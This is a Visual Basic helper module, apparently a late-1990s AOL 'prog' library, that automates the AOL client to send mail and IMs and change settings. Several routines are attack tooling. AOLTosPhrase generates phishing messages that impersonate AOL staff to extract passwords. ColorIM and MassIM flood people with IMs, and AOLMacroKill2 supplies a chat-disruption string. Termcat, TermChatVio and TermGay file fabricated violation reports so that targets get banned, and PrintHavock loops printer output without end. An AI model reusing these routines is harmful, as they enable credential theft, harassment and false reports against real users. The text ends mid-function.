AOL = FindWindow("AOL Frame25", 0&)
bah = FindChildByTitle(AOL, "Keyword")
daedit = FindChildByClass(bah, "_AOL_Edit")
Pause (0.001)
Loop Until daedit <> 0
daedit = FindChildByClass(bah, "_AOL_Edit")
Call AOLSetText(daedit, Where$)
ico% = FindChildByClass(bah, "_AOL_Icon")
Ao4Click ico%
End Sub

Sub Ao4mailcenter()
AOL% = FindWindow("AOL Frame25", 0&)
toolbar2% = FindChildByClass(AOL%, "AOL Toolbar")
ToolBarChild% = FindChildByClass(toolbar2%, "_AOL_Toolbar")
TooLBaRB% = FindChildByClass(ToolBarChild%, "_AOL_Icon")
TooLBaRB% = GetWindow(TooLBaRB%, 2)
MCenter% = GetWindow(TooLBaRB%, 2)
Ao4Click MCenter%


End Sub

Sub Ao4MailSend(SendTo$, Subject$, text$)
AOL% = FindWindow("AOL Frame25", 0&)
toolba2r% = FindChildByClass(AOL%, "AOL Toolbar")
ToolBarChild% = FindChildByClass(toolbar2%, "_AOL_Toolbar")
TooLBaRB% = FindChildByClass(ToolBarChild%, "_AOL_Icon")
TooLBaRB% = GetWindow(TooLBaRB%, 2)
Ao4Click TooLBaRB%

Do
X% = DoEvents()
chatlist% = FindChildByTitle(FindWindow("AOL Frame25", 0&), "Compose Mail")
Chatedit% = FindChildByClass(chatlist%, "_AOL_Edit")
hideit = ShowWindow(chatlist%, SW_HIDE)
Loop Until Chatedit% <> 0
chatlist% = FindChildByTitle(FindWindow("AOL Frame25", 0&), "Compose Mail")
hideit = ShowWindow(chatlist%, SW_HIDE)
chatwin% = GetParent(chatlist%)
Button2% = FindChildByClass(chatlist%, "_AOL_Icon")
Chatedit% = FindChildByClass(chatlist%, "_AOL_Edit")
sndtext% = SendMessageByString(Chatedit%, WM_SETTEXT, 0, SendTo$)
blah% = GetWindow(Chatedit%, GW_HWNDNEXT)
good% = GetWindow(blah%, GW_HWNDNEXT)
bad% = GetWindow(good%, GW_HWNDNEXT)
Sad% = GetWindow(bad%, GW_HWNDNEXT)
sndtext% = SendMessageByString(Sad%, WM_SETTEXT, 0, Subject$)
Rich = FindChildByClass(chatlist%, "RICHCNTL")
sndtext% = SendMessageByString(Rich, WM_SETTEXT, 0, text$ & " ")
SendNow% = SendMessageByNum(Button2%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SendMessageByNum(Button2%, WM_LBUTTONUP, &HD, 0)
chatlist% = FindChildByTitle(FindWindow("AOL Frame25", 0&), "Compose Mail")
Button2% = FindChildByClass(chatlist%, "_AOL_Icon")
SendNow% = SendMessageByNum(Button2%, WM_LBUTTONDOWN, &HD, 0)
SendNow% = SendMessageByNum(Button2%, WM_LBUTTONUP, &HD, 0)
Pause 0.2

End Sub

Sub Ao4openmail()
AOL% = FindWindow("AOL Frame25", 0&)
toolbar2% = FindChildByClass(AOL%, "AOL Toolbar")
ToolBarChild% = FindChildByClass(toolbar2%, "_AOL_Toolbar")
TooLBaRB% = FindChildByClass(ToolBarChild%, "_AOL_Icon")
Ao4Click TooLBaRB%


End Sub

Sub Ao4Sendtext(TextToSend$)

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
firs% = GetWindow(MDI%, 5)
listers% = FindChildByClass(firs%, "RICHCNTL")
Listere% = GetWindow(listers%, 2)
nxt% = GetWindow(Listere%, 2)
NXT1% = GetWindow(nxt%, 2)
NXT2% = GetWindow(NXT1%, 2)
NXT3% = GetWindow(NXT2%, 2)
NXT4% = GetWindow(NXT3%, 2)
Listerb% = FindChildByClass(firs%, "_AOL_Listbox")
LISTER1% = FindChildByClass(firs%, "_AOL_Combobox")
DoEvents
DoEvents
sndtext% = SendMessageByString(NXT4%, WM_SETTEXT, 0, TextToSend$)
DoEvents
DoEvents
SendNow% = SendMessageByNum(NXT4%, WM_CHAR, &HD, 0)
DoEvents
End Sub

Sub Ao4Title(NewTitle$)
AOL% = FindWindow("AOL Frame25", 0&)
'textset Aol%, NewTitle$
End Sub

Sub Ao4writemail()
AOL% = FindWindow("AOL Frame25", 0&)
toolbar2% = FindChildByClass(AOL%, "AOL Toolbar")
ToolBarChild% = FindChildByClass(toolbar2%, "_AOL_Toolbar")
TooLBaRB% = FindChildByClass(ToolBarChild%, "_AOL_Icon")
TooLBaRB% = GetWindow(TooLBaRB%, 2)
Ao4Click TooLBaRB%


End Sub

Sub AOLIcon(icon%)
Clck% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Clck% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub ColorIM(person As String)
'This sends someone blank IMs with a different colors
'in each one. It sends 5 IMs but then it loops so
'add a stop button
Do:
DoEvents
Call sendim(person$, "<body bgcolor=#000000>")
Call sendim(person$, "<body bgcolor=#0000FF>")
Call sendim(person$, "<body bgcolor=#FF0000>")
Call sendim(person$, "<body bgcolor=#00FF00>")
Call sendim(person$, "<body bgcolor=#C0C0C0>")
Loop 'This will loop untill a stop button is pressed.
End Sub
Function BS_Antipunt()
im% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
    Do
    im% = FindChildByTitle(AOLMDI(), ">Instant Message From:")
    killwin (im%)
    Loop Until im% = 0



End Function
Function MouseOverHwnd()
    ' Declares
      Dim pt32 As POINTAPI
      Dim ptx As Long
      Dim pty As Long
   
      Call GetCursorPos(pt32)               ' Get cursor position
      ptx = pt32.X
      pty = pt32.Y
      MouseOverHwnd = WindowFromPoint(ptx, pty)    ' Get window cursor is over
End Function
Sub MaxWindow(hWnd)
ma = ShowWindow(hWnd, SW_MAXIMIZE)
End Sub

Sub MiniWindow(hWnd)
mi = ShowWindow(hWnd, SW_MINIMIZE)
End Sub
Function KTEncrypt(ByVal password, ByVal strng, force%)
'Example:
'temp = KTEncrypt ("Paszwerd", text1.text, 0)
'text1.text = temp


  'Set error capture routine
  On Local Error GoTo ErrorHandler

  
  'Is there Password??
  If Len(password) = 0 Then Error 31100
  
  'Is password too long
  If Len(password) > 255 Then Error 31100

  'Is there a strng$ to work with?
  If Len(strng) = 0 Then Error 31100

  
  'Check if file is encrypted and not forcing
  If force% = 0 Then
    
    'Check for encryption ID tag
    chk$ = Left$(strng, 4) + Right$(strng, 4)
    
    If chk$ = Chr$(1) + "KT" + Chr$(1) + Chr$(1) + "KT" + Chr$(1) Then
      
      'Remove ID tag
      strng = Mid$(strng, 5, Len(strng) - 8)
      
      'String was encrypted so filter out CHR$(1) flags
      look = 1
      Do
        look = InStr(look, strng, Chr$(1))
        If look = 0 Then
          Exit Do
        Else
          Addin$ = Chr$(Asc(Mid$(strng, look + 1)) - 1)
          strng = Left$(strng, look - 1) + Addin$ + Mid$(strng, look + 2)
        End If
        look = look + 1
      Loop
      
      'Since it is encrypted we want to decrypt it
      EncryptFlag% = False
    
    Else
      'Tag not found so flag to encrypt string
      EncryptFlag% = True
    End If
  Else
    'force% flag set, ecrypt string regardless of tag
    EncryptFlag% = True
  End If
    


  'Set up variables
  PassUp = 1
  PassMax = Len(password)
  
  
  'Tack on leading characters to prevent repetative recognition
  password = Chr$(Asc(Left$(password, 1)) Xor PassMax) + password
  password = Chr$(Asc(Mid$(password, 1, 1)) Xor Asc(Mid$(password, 2, 1))) + password
  password = password + Chr$(Asc(Right$(password, 1)) Xor PassMax)
  password = password + Chr$(Asc(Right$(password, 2)) Xor Asc(Right$(password, 1)))
  
  
  'If Encrypting add password check tag now so it is encrypted with string
  If EncryptFlag% = True Then
    strng = Left$(password, 3) + Format$(Asc(Right$(password, 1)), "000") + Format$(Len(password), "000") + strng
  End If
  
  'Loop until scanned though the whole string
  For Looper = 1 To Len(strng)
DoEvents
    'Alter character code
    tochange = Asc(Mid$(strng, Looper, 1)) Xor Asc(Mid$(password, PassUp, 1))

    'Insert altered character code
    Mid$(strng, Looper, 1) = Chr$(tochange)
    
    'Scroll through password string one character at a time
    PassUp = PassUp + 1
    If PassUp > PassMax + 4 Then PassUp = 1
      
  Next Looper

  'If encrypting we need to filter out all bad character codes (0, 10, 13, 26)
  If EncryptFlag% = True Then
    'First get rid of all CHR$(1) since that is what we use for our flag
    look = 1
    Do
      look = InStr(look, strng, Chr$(1))
      If look > 0 Then
        strng = Left$(strng, look - 1) + Chr$(1) + Chr$(2) + Mid$(strng, look + 1)
        look = look + 1
      End If
    Loop While look > 0

    'Check for CHR$(0)
    Do
      look = InStr(strng, Chr$(0))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(1) + Mid$(strng, look + 1)
    Loop While look > 0

    'Check for CHR$(10)
    Do
      look = InStr(strng, Chr$(10))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(11) + Mid$(strng, look + 1)
    Loop While look > 0

    'Check for CHR$(13)
    Do
      look = InStr(strng, Chr$(13))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(14) + Mid$(strng, look + 1)
    Loop While look > 0

    'Check for CHR$(26)
    Do
      look = InStr(strng, Chr$(26))
      If look > 0 Then strng = Left$(strng, look - 1) + Chr$(1) + Chr$(27) + Mid$(strng, look + 1)
    Loop While look > 0

    'Tack on encryted tag
    strng = Chr$(1) + "KT" + Chr$(1) + strng + Chr$(1) + "KT" + Chr$(1)

  Else
    
    'We decrypted so ensure password used was the correct one
    If Left$(strng, 9) <> Left$(password, 3) + Format$(Asc(Right$(password, 1)), "000") + Format$(Len(password), "000") Then
      'Password bad cause error
      Error 31100
    Else
      'Password good, remove password check tag
      strng = Mid$(strng, 10)
    End If

  End If


  'Set function equal to modified string
  KTEncrypt = strng
  

  'Were out of here
  Exit Function


ErrorHandler:
  
  'We had an error!  Were out of here
  Exit Function

End Function

Public Sub center(frmForm As Form)
   With frmForm
      .Left = (Screen.Width - .Width) / 2
      .Top = (Screen.Height - .Height) / 2
   End With
End Sub
Function FindSendWin(dosloop)
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Send Now")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindSendWin = firs%

Exit Function
begis:
FindSendWin = firss%
End Function
Function FindOpenMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
ChildFocus% = GetWindow(MDI%, 5)

While ChildFocus%
listers% = FindChildByClass(ChildFocus%, "RICHCNTL")
Listere% = FindChildByClass(ChildFocus%, "_AOL_Icon")
Listerb% = FindChildByClass(ChildFocus%, "_AOL_Button")

If listers% <> 0 And Listere% <> 0 And Listerb% <> 0 Then FindOpenMail = ChildFocus%: Exit Function
ChildFocus% = GetWindow(ChildFocus%, 2)
Wend


End Function
Public Function FindForwardWindow() As Long
    Dim AOL As Long, MDI As Long, child As Long
    Dim Rich1 As Long, Rich2 As Long, Combo As Long
    Dim FontCombo As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Rich1& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
    Rich2& = FindWindowEx(child&, Rich1&, "RICHCNTL", vbNullString)
    Combo& = FindWindowEx(child&, 0&, "_AOL_Combobox", vbNullString)
    FontCombo& = FindWindowEx(child&, 0&, "_AOL_FontCombo", vbNullString)
    If Rich1& <> 0& And Rich2& = 0& And Combo& = 0& And FontCombo& = 0& Then
        FindForwardWindow& = child&
        Exit Function
    Else
        Do
            child& = FindWindowEx(MDI&, child&, "AOL Child", vbNullString)
            Rich1& = FindWindowEx(child&, 0&, "RICHCNTL", vbNullString)
            Rich2& = FindWindowEx(child&, Rich1&, "RICHCNTL", vbNullString)
            Combo& = FindWindowEx(child&, 0&, "_AOL_Combobox", vbNullString)
            FontCombo& = FindWindowEx(child&, 0&, "_AOL_FontCombo", vbNullString)
            If Rich1& <> 0& And Rich2& = 0& And Combo& = 0& And FontCombo& = 0& Then
                FindForwardWindow& = child&
                Exit Function
            End If
        Loop Until child& = 0&
    End If
    FindForwardWindow& = 0&
End Function



Function FindFwdWin(dosloop)
'FindFwdWin = GetParent(FindChildByTitle(FindChildByClass(AOLMDI(), "AOL Child"), "Forward"))
'Exit Function
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firss%, "Forward")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = FindChildByTitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindFwdWin = firs%

Exit Function
begis:
FindFwdWin = firss%
End Function
Function ReplaceText(text, charfind, charchange)
If InStr(text, charfind) = 0 Then
ReplaceText = text
Exit Function
End If

For Replace = 1 To Len(text)
thechar$ = Mid(text, Replace, 1)
thechars$ = thechars$ & thechar$

If thechar$ = charfind Then
thechars$ = Mid(thechars$, 1, Len(thechars$) - 1) + charchange
End If
Next Replace

ReplaceText = thechars$

End Function
Function ReverseText(text)
For Words = Len(text) To 1 Step -1
ReverseText = ReverseText & Mid(text, Words, 1)
Next Words


End Function
Sub AcidTrip(frm As Form)
' Place this in a timer and watch the colors =)
Dim cx, cy, Radius, Limit
    frm.ScaleMode = 3
    cx = frm.ScaleWidth / 2
    cy = frm.ScaleHeight / 2
    If cx > cy Then Limit = cy Else Limit = cx
    For Radius = 0 To Limit
frm.Circle (cx, cy), Radius, RGB(Rnd * 255, Rnd * 255, Rnd * 255)
    Next Radius
End Sub
Sub AOLScrew()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)

End Sub
Public Sub CenterFormTop(frm As Form)
'this will center the form in the top center of
'the user's screen
   With frm
      .Left = (Screen.Width - .Width) / 2
      .Top = (Screen.Height - .Height) / (Screen.Height)
   End With
End Sub
Sub PrintHavock()
Do
Dim MyVar
MyVar = "Youve Been Had by H8er"
Printer.Print ; MyVar
Loop
End Sub
Function PlayAvi()
'Plays a AVI File Change the path Below to your
'AVI Path
lRet = MciSendString("play c:\windows\help\scroll.avi", 0&, 0, 0)
End Function
Sub password(Txt As TextBox)
'Heres a Password checker for all those Secret Areas
'In your Proggs To change the Password just change
'Where it says Bob to whatever your Password is
'Make sure u keep it in quotes
PW = "bob"
If Not Txt = PW Then
MsgBox "Invalid Password try again", vbOK, "Imagine98"
End If
If Txt = PW Then
MsgBox "Right Password"

End If
End Sub

Public Sub MassIM(Lst As ListBox, Txt As TextBox)

For i% = 0 To Lst.ListCount - 1
Call IMsend(Lst.List(i%), Txt.text)
Next i%

End Sub
Function FreeProcess()
Do: DoEvents
Process = Process + 1
If Process = 50 Then Exit Do
Loop
'frees process of freezes in your program
'and other stuff that makes your program
'slow down.  Works great.

End Function

Function PlayMIDI()
'Plays a Midi File Change the path Below to your
'Midi Path
lRet = MciSendString("play C:\imagine98\1.mid", 0&, 0, 0) ' or whatever the File Name is

End Function
Sub ChangeCaption(newcaption As String)
'This changes the "America  Online" to whatever
'you change newcaption to
Call SetText(findaol(), newcaption)
End Sub
Function findaol()
'finds the AOL window
AOL% = FindWindow("AOL Frame25", vbNullString)
findaol = AOL%
End Function
Function FindAOLsMDI()
'this can be used instead of typing out the two
'lines of code below
AOL% = FindWindow("AOL Frame25", vbNullString)
FindAOLsMDI = FindChildByClass(AOL%, "MDIClient")
End Function
Sub AOLGhost(Way$)

AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
XAOL4_Keyword ("buddy")

Do: DoEvents
a1% = FindChildByTitle(MDI%, user32SN & "'s Buddy Lists")
Loop Until a1% <> 0

a2% = FindChildByClass(a1%, "_AOL_Listbox")
A7% = GetWindow(a2%, GW_HWNDNEXT)
A7% = GetWindow(A7%, GW_HWNDNEXT)
A7% = GetWindow(A7%, GW_HWNDNEXT)
A7% = GetWindow(A7%, GW_HWNDNEXT)
A7% = GetWindow(A7%, GW_HWNDNEXT)

Do: DoEvents
Call AOLClickIcon(A7%)
Pause (0.2)
B1% = FindChildByTitle(MDI%, "Privacy Preferences")
Loop Until B1% <> 0

If Way$ = "Ghost" Then

Do: DoEvents
B2% = FindChildByTitle(B1%, "Block all AOL members and AOL Instant Messenger user32s")
Loop Until B2% <> 0
AOLClickIcon (B2%): AOLClickIcon (B2%): Pause (0.1)

B2% = GetWindow(B2%, GW_HWNDNEXT)
B2% = GetWindow(B2%, GW_HWNDNEXT)
B2% = GetWindow(B2%, GW_HWNDNEXT)
B2% = GetWindow(B2%, GW_HWNDNEXT)
B2% = GetWindow(B2%, GW_HWNDNEXT)
B2% = GetWindow(B2%, GW_HWNDNEXT)
B2% = GetWindow(B2%, GW_HWNDNEXT)
B2% = GetWindow(B2%, GW_HWNDNEXT)
B2% = GetWindow(B2%, GW_HWNDNEXT)
AOLClickIcon (B2%): AOLClickIcon (B2%): DoEvents

Else

Do: DoEvents
B2% = FindChildByTitle(B1%, "Allow all AOL members and AOL Instant Messenger")
Loop Until B2% <> 0
AOLClickIcon (B2%): AOLClickIcon (B2%): Pause (0.1)
End If

B41% = GetWindow(B2%, GW_HWNDLAST)
B41% = GetWindow(B41%, GW_HWNDPREV)
B41% = GetWindow(B41%, GW_HWNDPREV)
B41% = GetWindow(B41%, GW_HWNDPREV)

Do: DoEvents
    AOLClickIcon (B41%): DoEvents
    B1% = FindChildByTitle(MDI%, "Privacy Preferences")
Loop Until B1% = 0
Do: DoEvents
    B1% = FindChildByTitle(MDI%, "Privacy Preferences")
    killwin B1%
Loop Until B1% = 0

Do: DoEvents
okw% = FindWindow("#32770", "America Online")
okb% = FindChildByTitle(okw%, "OK")
Loop Until okb% <> 0
AOLClickIcon (okb%)
killwin (a1%)

End Sub
Sub AOLlocateMember(SN)
'This will locate a member online. duh
Call XAOL4_Keyword("aol://3548:" & SN)
End Sub


Function AOLMacroKill2()
AOLMacroKill2 = "<FONT  COLOR=""#fffeff"" SIZE=3 PTSIZE=10>@@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ @@@@@@@@@@@@ <BR>{S Goodbye"
End Function
Function AOLTosPhrase()
Dim dsa$
Dim das$
dsa$ = ""
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then dsa$ = "Hi [sn], "
If asd = 2 Then dsa$ = "Hello [sn], "
If asd = 3 Then dsa$ = "Good Day [sn], "
If asd = 4 Then dsa$ = "Good Afternoon [sn], "
If asd = 5 Then dsa$ = "Good Evening [sn], "
If asd = 6 Then dsa$ = "Good Morning [sn], "
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = dsa$ & "I am with the AOL User Resource Department. "
If asd = 2 Then das$ = dsa$ & "I am Steve Case the C.E.O. of America Online. "
If asd = 3 Then das$ = dsa$ & "I am a Guide for America Online. "
If asd = 4 Then das$ = dsa$ & "I am with the AOL Online Security Force. "
If asd = 5 Then das$ = dsa$ & "I am with AOL's billing department. "
If asd = 6 Then das$ = dsa$ & "I am with the America Online User Department. "
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = das$ & "Due to some invalid information, we need you to verify your log-on password to avoid account cancellation. "
If asd = 2 Then das$ = das$ & "Due to a virus in one of our servers, I am required to validate your password. Failure to do so will cause in immediate canalization of this account."
If asd = 3 Then das$ = das$ & "During your sign on period your password number did not cycle, please respond with the password used when settin up this screen name. Failure to do so will result in immediate cancellation of your account."
If asd = 4 Then das$ = das$ & "Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online. "
If asd = 5 Then das$ = das$ & "I have seen people calling from CANADA using this account. Please verify that you are the correct user by giving me your password. Failure to do so will result in immediate cansellation of this account."
If asd = 6 Then das$ = das$ & "We here at AOL have made a SERIOUS billing error. We have your sign on passoword as 4ry67e, If this is not correct, please respond with the correct password. "
 Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = das$ & "Sorry for this inconvenience. Have a nice day.   :-)"
If asd = 2 Then das$ = das$ & "Thank you and have a nice day using America Online.   :-)"
If asd = 3 Then das$ = das$ & "Thank you and have a nice day.   :-)"
If asd = 4 Then das$ = das$ & "Thank you.   :-)"
If asd = 5 Then das$ = das$ & "Thank you, and enjoy your time on America Online. :-) "
If asd = 6 Then das$ = das$ & "Thank you for your time and cooperation and we hope that you enjoy America Online. :-). "
 
AOLTosPhrase = das$

 
End Function
Function Arrows(times)
Randomize
FF = Int(Rnd * 3) + 1
If FF = 1 Then
For ii = 1 To times
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">å")
TimeOut 0.2
Call AOLChatsend("<font face=""Wingdings"" color=""#000000"">â")
TimeOut 0.2
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">æ")
TimeOut 0.2
Call AOLChatsend("  <font face=""Wingdings"" color=""#000000"">â")
TimeOut 1.5
Next ii
End If

If FF = 2 Then
For ii = 1 To times
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">í")
TimeOut 0.2
Call AOLChatsend("<font face=""Wingdings"" color=""#000000"">ê")
TimeOut 0.2
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">î")
TimeOut 0.2
Call AOLChatsend("  <font face=""Wingdings"" color=""#000000"">ê")
TimeOut 1.5
Next ii
End If

If FF = 3 Then
For ii = 1 To times
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">÷")
TimeOut 0.2
Call AOLChatsend("<font face=""Wingdings"" color=""#000000"">ò")
TimeOut 0.2
Call AOLChatsend(" <font face=""Wingdings"" color=""#000000"">ø")
TimeOut 0.2
Call AOLChatsend("  <font face=""Wingdings"" color=""#000000"">ò")
TimeOut 1.5
Next ii
End If
End Function

Function FadeToTop(frm As Form, frm2 As Form)
CenterForm frm
Do
frm.Top = frm.Top - 25
frm.Width = frm.Width - 25
frm.Height = frm.Height - 25
frm.Left = Screen.Width / 2 - frm.Width / 2
Loop Until frm.Top < 200
frm2.Show
frm.Hide
StayOnTop frm2
End Function
Sub UpChatOff()
'  call upchatoff
AOM% = FindWindow("_AOL_Modal", vbNullString)
DoEvents
X = ShowWindow(AOM%, SW_SHOW)
X = SetFocusAPI(AOM%)

End Sub

Sub UpChatOn()
'  call upcahton
AOL% = FindWindow("AOL Frame25", vbNullString)
AOM% = FindWindow("_AOL_Modal", vbNullString)
DoEvents
X = ShowWindow(AOM%, SW_HIDE)
X = SetFocusAPI(AOL%)

End Sub

Sub StopButton()

Do
DoEvents:
Loop
End Sub
Sub Termcat(who, Phrase)
AOL% = FindWindow("AOL Frame25", 0&)
Keyword "Guide Pager"
Do
DoEvents
help% = FindChildByTitle(AOL%, "I Need Help!")
Loop Until help% <> 0
AOLIcon2% = GetWindow(GetWindow(FindChildByClass(help%, "_AOL_Icon"), GW_HWNDNEXT), GW_HWNDNEXT)
click AOLIcon2%
Do
DoEvents
RAV% = FindChildByTitle(AOL%, "Report a Violation")
Loop Until RAV% <> 0
CAT% = GetWindow(FindChildByTitle(RAV%, "Other TOS" & Chr$(13) & "Questions"), GW_HWNDNEXT)
click CAT%
Do
DoEvents
CATWrite% = FindChildByTitle(AOL%, "Write to Community Action Team")
Loop Until CATWrite% <> 0
AOLEdit% = FindChildByClass(CATWrite%, "_AOL_Edit")
sends% = FindChildByTitle(CATWrite%, "Send")
Call AOLSetText(AOLEdit%, "I recieved this instant message at " + Format$(Now, "h:mm:ss") + "." + Chr$(13) + Chr$(10) + who + ":" + Chr$(9) + Phrase)
click sends%
Call waitforok
Call closewin(help%)
Call closewin(RAV%)
End Sub

Sub TermChatVio(who, Phrase)
AOL% = FindWindow("AOL Frame25", 0&)
Keyword "Guide Pager"
Do
DoEvents
help% = FindChildByTitle(AOL%, "I Need Help!")
Loop Until help% <> 0
AOLIcon2% = GetWindow(FindChildByClass(help%, "_AOL_Icon"), GW_HWNDNEXT)
click AOLIcon2%
Do
DoEvents
Notify% = FindChildByTitle(AOL%, "Notify AOL")
Notify% = FindChildByClass(Notify%, "_AOL_Edit")
Notify% = GetParent(Notify%)
Loop Until Notify% <> 0
RoomName% = FindChildByClass(Notify%, "_AOL_Edit")
TimeDate% = GetWindow(RoomName%, GW_HWNDNEXT)
person% = GetWindow(GetWindow(TimeDate%, GW_HWNDNEXT), GW_HWNDNEXT)
text% = GetWindow(GetWindow(GetWindow(person%, GW_HWNDNEXT), GW_HWNDNEXT), GW_HWNDNEXT)
sends% = FindChildByClass(Notify%, "_AOL_View")
sends% = GetWindow(GetWindow(GetWindow(sends%, GW_HWNDNEXT), GW_HWNDNEXT), GW_HWNDNEXT)
Call setedit(RoomName%, "Lobby " & Int(Rnd * 200) + 1)
Call setedit(TimeDate%, gettime() + " " + Date)
Call setedit(person%, who)
Call setedit(text%, Phrase)
click sends%
Call waitforok
Call closewin(Notify%)
Call closewin(help%)
End Sub

Function TermGay(who)
Dim Phrase As String
Randomize Timer
X = Int(Rnd * 6) + 1
If X = 1 Then Phrase$ = Phrase$ + "SuP! "
If X = 2 Then Phrase$ = Phrase$ + "Hey Man! "
If X = 3 Then Phrase$ = Phrase$ + "SuP d00d! "
If X = 4 Then Phrase$ = Phrase$ + "Hi Man! "
If X = 5 Then Phrase$ = Phrase$ + "SuP Man! "
If X = 6 Then Phrase$ = Phrase$ + "Hola! "
X = Int(Rnd * 5) + 1
If X = 1 Then Phrase$ = Phrase$ + "Listen d00d "
If X = 2 Then Phrase$ = Phrase$ + "Listen Man "
If X = 3 Then Phrase$ = Phrase$ + "Dood... "
If X = 4 Then Phrase$ = Phrase$ + "Shit Listen... "
If X = 5 Then Phrase$ = Phrase$ + "Fuck man, "
X = Int(Rnd * 4) + 1
If X = 1 Then Phrase$ = Phrase$ + "I got only one this phish left and I need more "
If X = 2 Then Phrase$ = Phrase$ + "I'm runnin real low on phish "
If X = 3 Then Phrase$ = Phrase$ + "This is my last phish "
If X = 4 Then Phrase$ = Phrase$ + "My entire phish log got deleted"
Phrase$ = Phrase$ + Chr$(13) + Chr$(10) + who + ":" + Chr$(9)
X = Int(Rnd * 4) + 1
If X = 1 Then Phrase$ = Phrase$ + "Can I have that account? "
If X = 2 Then Phrase$ = Phrase$ + "Cud ya give me the Password to that account. "
If X = 3 Then Phrase$ = Phrase$ + "Man please gimme the PW to that SN. "
If X = 4 Then Phrase$ = Phrase$ + "I sware i'll give you more accounts if you just give me that one so I can go phishing on it. "
X = Int(Rnd * 2) + 1
If X = 1 Then Phrase$ = Phrase$ + Chr$(13) + Chr$(10) + "Thanx Man "
If X = 2 Then Phrase$ = Phrase$ + Chr$(13) + Chr$(10) + "Thanx d00d "



AOL% = FindWindow("AOL Frame25", 0&)
Keyword "Guide Pager"
Do
DoEvents
help% = FindChildByTitle(AOL%, "I Need Help!")
Loop Until help% <> 0
AOLIcon2% = FindChildByClass(help%, "_AOL_Icon")
click AOLIcon2%
'Call SendPW(who, phrase)

AOLIcon2% = GetWindow(GetWindow(FindChildByClass(help%, "_AOL_Icon"), GW_HWNDNEXT), GW_HWNDNEXT)
click AOLIcon2%
Do
DoEvents
RAV% = FindChildByTitle(AOL%, "Report a Violation")
Loop Until RAV% <> 0
im% = GetWindow(FindChildByTitle(RAV%, "IM" & Chr$(13) & "Violation"), GW_HWNDNEXT)
click im%
Do
DoEvents
VVIM% = FindChildByTitle(AOL%, "Violations via Instant Messages")
Loop Until VVIM% <> 0
VioDate% = FindChildByClass(VVIM%, "_AOL_Edit")
VioTime% = GetWindow(FindChildByTitle(VVIM%, "Time AM/PM"), GW_HWNDNEXT)
VioMess% = GetWindow(FindChildByTitle(VVIM%, "CUT and PASTE a copy of the IM here"), GW_HWNDNEXT)

CurTime$ = gettime()
Call setedit(VioDate%, Date)
Call setedit(VioTime%, CurTime$)
Call setedit(VioMess%, whoe$ + ":" + Chr$(9) + phrasee$)
sends% = FindChildByTitle(VVIM%, "Send")
click sends%
Call waitforok
Call closewin(help%)
Call closewin(RAV%)
End Function


Sub TermIMVio(who, Phrase)
AOL% = FindWindow("AOL Frame25", 0&)
Keyword "Guide Pager"
Do
DoEvents
help% = FindChildByTitle(AOL%, "I Need Help!")
Loop Until help% <> 0
AOLIcon2% = GetWindow(GetWindow(FindChildByClass(help%, "_AOL_Icon"), GW_HWNDNEXT), GW_HWNDNEXT)
click AOLIcon2%
Do
DoEvents
RAV% = FindChildByTitle(AOL%, "Report a Violation")
Loop Until RAV% <> 0
im% = GetWindow(FindChildByTitle(RAV%, "IM" & Chr$(13) & "Violation"), GW_HWNDNEXT)
click im%
Do
DoEvents
VVIM% = FindChildByTitle(AOL%, "Violations via Instant Messages")
Loop Until VVIM% <> 0
VioDate% = FindChildByClass(VVIM%, "_AOL_Edit")
